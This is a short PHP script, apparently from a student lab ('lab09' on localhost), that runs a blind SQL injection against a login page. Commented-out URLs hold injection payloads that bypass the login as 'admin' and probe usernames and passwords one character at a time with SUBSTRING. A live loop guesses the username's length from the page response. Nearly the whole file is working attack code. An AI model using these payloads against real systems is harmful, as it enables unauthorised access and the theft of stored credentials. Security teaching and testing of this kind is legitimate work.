<?php
//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(username,1,1)%20=%20%27a%27%20--%20"; // Celui fonctionne
//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20"

$i = 0;
while ($i < 25)
{
    $url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20length(username)%20=%20$i--%20";
	$result = file_get_contents($url);
	if (strpos($result, 'cat') !== false) {
		echo "\n";
		echo 'size is';
		print $i;
		break;
	}else{
		//echo "\n";
		//echo "nope";
	}

	$i++;
}



/*$result = file_get_contents($url);

print($result);


if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}*/

echo "\n";

?>